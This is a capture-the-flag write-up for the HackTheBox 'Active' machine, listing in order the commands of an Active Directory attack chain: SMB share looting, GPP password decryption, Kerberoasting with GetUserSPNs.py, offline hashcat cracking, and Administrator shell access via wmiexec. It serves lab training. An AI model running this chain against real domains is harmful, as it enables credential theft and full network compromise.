---
title: "Active — HackTheBox (Writeup)"
date: 2025-11-02
tags: [htb, active-directory, kerberoast, gpp]
summary: "AD enumeration → recovered service-account via GPP → Kerberoast → Administrator → flags."
---

## TL;DR
full-TCP scan → found an open SMB share and downloaded its contents → decrypted GPP XML and recovered a service account’s plaintext credential → used the service account to access files and retrieve **user.txt** → enumerated Kerberos SPNs for kerberoastable accounts with the service account → checked DC time via LDAP and fixed local clock skew → requested TGS blobs (GetUserSPNs) → cracked TGS blobs offline (hashcat) to recover an elevated credential → authenticated as Administrator and used remote exec (wmiexec/psexec) to retrieve **root.txt**.

---

## Chronology, commands, concise notes

### 1) Discovery — full TCP sweep
```
sudo nmap -p- -T4 192.0.2.100 -oN scans/all_ports.txt
```

### 2) Extract open ports for targeted scan
```
ports=$(awk '/\/tcp/ && /open/ { split($1,a,"/"); p = (p ? p "," a[1] : a[1]) } END{ print p }' scans/all_ports.txt)
```
```
sudo nmap -sC -sV -p "$ports" 192.0.2.100 -oN scans/version.txt
```

### 3) Hostname mapping for AD tools
```
echo '192.0.2.100 dc.example.test dc' | sudo tee -a /etc/hosts
```

### 4) SMB enumeration — found an open, readable SMB share
```
smbclient -L //192.0.2.100 -N -I 192.0.2.100
```

### 5) Download share contents (artifact collection)
```
smbclient //192.0.2.100/<SHARE> -N -I 192.0.2.100 -c "recurse; prompt; mget *"
```

### 6) Decrypt GPP XML — recover service-account credential
```
gpp-decrypt -f "./active.<DOMAIN>/Policies/{GUID}/MACHINE/Preferences/Groups/Groups.xml"
```

### 7) Use service account to access files — obtained user.txt
```
nxc smb 192.0.2.100 -u 'active.<DOMAIN>\svc_account' -p '<REDACTED_PASSWORD>' --shares
```

### 8) Enumerate Kerberos SPNs (kerberoastable accounts)
```
GetUserSPNs.py 'active.<DOMAIN>/svc_account:<REDACTED_PASSWORD>' -dc-ip 192.0.2.100 -request -outputfile tgs_hashes.txt
```

### 9) Check DC time and sync local clock (if KRB_AP_ERR_SKEW)
```
ldapsearch -x -H ldap://192.0.2.100 -s base -b "" currentTime
```

```
sudo date -u -s "YYYY-MM-DD HH:MM:SS"
```

### 10) Re-run GetUserSPNs to collect TGS blobs
```
GetUserSPNs.py 'active.<DOMAIN>/svc_account:<REDACTED_PASSWORD>' -dc-ip 192.0.2.100 -request -outputfile tgs_hashes.txt
```

### 11) Crack TGS blobs offline (Kerberoast)
```
hashcat -m 13100 tgs_hashes.txt /path/to/wordlist.txt -a 0
```

### 12) Authenticate as Administrator & remote execution
```
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py 'ACTIVE.<DOMAIN>/Administrator:<REDACTED_ADMIN_PASSWORD>'@192.0.2.100
```
```
type C:\Users\Administrator\Desktop\root.txt
```

## Tools & techniques demonstrated

nmap, smbclient / nxc, gpp-decrypt, Impacket GetUserSPNs.py, ldapsearch, hashcat, Impacket wmiexec.py/psexec — AD enumeration, GPP credential recovery, Kerberoast (TGS collection + offline cracking), remote execution.
